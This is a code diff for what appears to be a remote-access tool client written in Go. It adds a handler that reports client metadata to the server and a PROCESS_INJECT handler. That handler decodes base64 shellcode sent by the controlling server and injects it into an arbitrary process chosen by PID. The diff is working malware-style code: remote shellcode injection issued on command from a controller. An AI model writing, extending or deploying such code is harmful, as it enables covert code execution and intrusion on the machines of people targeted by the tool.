@@ -35,8 +35,10 @@ var handlers = map[string]func(pack modules.Packet, wsConn *common.Conn){
 	`FILES_REMOVE`:     removeFiles,
 	`FILES_UPLOAD`:     uploadFiles,
 	`FILE_UPLOAD_TEXT`: uploadTextFile,
+	`CLIENT_INFO`:      clientInfo,
 	`PROCESSES_LIST`:   listProcesses,
 	`PROCESS_KILL`:     killProcess,
+	`PROCESS_INJECT`:   injectProcess,
 	`DESKTOP_INIT`:     initDesktop,
 	`DESKTOP_PING`:     pingDesktop,
 	`DESKTOP_KILL`:     killDesktop,
@@ -254,6 +256,20 @@ func uploadTextFile(pack modules.Packet, wsConn *common.Conn) {
 	}
 }
 
+func clientInfo(pack modules.Packet, wsConn *common.Conn) {
+	// wan is passed by the server so we don't need an outbound HTTP call
+	wan := ``
+	if v, ok := pack.GetData(`wan`, reflect.String); ok {
+		wan = v.(string)
+	}
+	meta, err := GetMetadata(wan)
+	if err != nil {
+		wsConn.SendCallback(modules.Packet{Code: 1, Msg: err.Error()}, pack)
+		return
+	}
+	wsConn.SendCallback(modules.Packet{Code: 0, Data: map[string]any{`meta`: meta}}, pack)
+}
+
 func listProcesses(pack modules.Packet, wsConn *common.Conn) {
 	processes, err := process.ListProcesses()
 	if err != nil {
@@ -275,6 +291,34 @@ func killProcess(pack modules.Packet, wsConn *common.Conn) {
 		pid = int32(val.(float64))
 	}
 	err = process.KillProcess(int32(pid))
+	if err != nil {
+		wsConn.SendCallback(modules.Packet{Code: 1, Msg: err.Error()}, pack)
+	} else {
+		wsConn.SendCallback(modules.Packet{Code: 0}, pack)
+	}
+}
+
+func injectProcess(pack modules.Packet, wsConn *common.Conn) {
+	var scode string
+	var pid uint32
+	if val, ok := pack.Data[`shellcode`]; !ok {
+		wsConn.SendCallback(modules.Packet{Code: 1, Msg: `${i18n|COMMON.INVALID_PARAMETER}`}, pack)
+		return
+	} else {
+		scode = val.(string)
+	}
+	if val, ok := pack.GetData(`pid`, reflect.Float64); !ok {
+		wsConn.SendCallback(modules.Packet{Code: 1, Msg: `${i18n|COMMON.INVALID_PARAMETER}`}, pack)
+		return
+	} else {
+		pid = uint32(val.(float64))
+	}
+	scodeBytes, err := base64.StdEncoding.DecodeString(scode)
+	if err != nil {
+		wsConn.SendCallback(modules.Packet{Code: 1, Msg: err.Error()}, pack)
+		return
+	}
+	err = shellcode.InjectProcess(scodeBytes, pid)
 	if err != nil {
 		wsConn.SendCallback(modules.Packet{Code: 1, Msg: err.Error()}, pack)
 	} else {
